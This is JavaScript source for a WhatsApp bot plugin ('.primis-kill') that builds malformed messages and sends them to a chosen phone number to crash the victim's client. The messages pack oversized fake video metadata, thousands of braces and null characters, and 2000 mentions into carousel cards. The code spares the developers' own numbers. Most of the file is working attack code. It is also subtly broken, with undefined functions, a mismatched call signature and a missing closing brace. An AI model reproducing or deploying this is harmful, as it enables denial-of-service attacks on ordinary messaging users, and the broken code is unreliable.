const { cmd } = require('../momy');
const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require('@whiskeysockets/baileys');
const axios = require('axios');
const crypto = require('crypto');

// Helper sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// DEV NUMBERS PROTECTION
// ============================================================
let devNumbers = [];

async function loadDevNumbers() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/dawestava-hub/new-bot/refs/heads/main/config.json');
        if (response.data && response.data.ownerNumber) {
            devNumbers = response.data.ownerNumber.map(num => {
                let cleanNum = num.toString().replace(/[^0-9]/g, '');
                if (cleanNum.startsWith('0')) cleanNum = '255' + cleanNum.substring(1);
                return cleanNum + '@s.whatsapp.net';
            });
            console.log(`✅ Loaded ${devNumbers.length} protected developer numbers`);
        }
    } catch (e) {
        console.log('⚠️ Could not load dev numbers, using default protection');
        devNumbers = ['55449746111@s.whatsapp.net', '554488122687@s.whatsapp.net'];
    }
}

function isDevNumber(jid) {
    return devNumbers.includes(jid);
}

loadDevNumbers();

// ============================================================
// PRIMIS CRASH FUNCTIONS
// ============================================================

async function ofmCrashSql(target) {
  let cards = [];
 
  for (let p = 0; p < 25; p++) {
    cards.push({ 
      header: {
        title: 'D5 TEAM',
        videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
      fileLength: "1099511627776",
      seconds: 172800,
      mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
      height: 1080,
      width: 1920,
      fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
      directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1774428565",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEECBhQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
    },
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(9999), 
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: `{"title":"${"\u0000".repeat(9000)}","rows":[]}`
          }
        ]
      }
    });
  }

  const PouMsg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32), 
          supportPayload: "{}"
        },
        interactiveMessage: {
          body: {
            text: "Primis Exposed"
          }, 
          carouselMessage: {
            cards: cards
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`),
           quotedMessage: {
             paymentInviteMessage: {
             serviceType: 3,
              expiryTimestamp: 7205
              }
            },
           remoteJid: "status@broadcast"
           }
        }
      }
    }
  }, {});

  await prim.relayMessage(target, PouMsg.message, {
    messageId: PouMsg.key.id
  }
);


// ============================================================
// OWNER COMMAND: .primis-kill
// ============================================================
cmd({
    pattern: "primis-kill",
    alias: ["pkill", "primis"],
    desc: "Primis crash attack - Carousel + newsletter crash",
    category: "bug",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    // Check if owner
    if (!isOwner) return reply("❌ Owner only command");

    // Get target
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else {
        return reply(`❌ Usage:

user: .primis-kill 55xxxxxxxxxxx`);
    }

    // Check if target is a developer number
    if (isDevNumber(target)) {
        return reply(`❌ Cannot attack developer number! This number is protected.`);
    }

    const targetNumber = target.split('@')[0];
    
    // Send attack started message
    await reply(`☘️ PRIMIS CRASH targeting: ${targetNumber}`);

    try {
        await ofmCrashSql(conn, target);
        await sleep(300);
        await CCt(conn, target);
        await sleep(300);
        await blankv1(conn, target);
        await sleep(300);
        await carouselCrash(conn, target);
        
        // Send success message
        await reply(`☘️ PRIMIS CRASH completed on: ${targetNumber}`);
        
    } catch (e) {
        console.error("Primis Crash Error:", e);
        reply(`❌ PRIMIS CRASH failed on: ${targetNumber} - Error: ${e.message}`);
    }
});
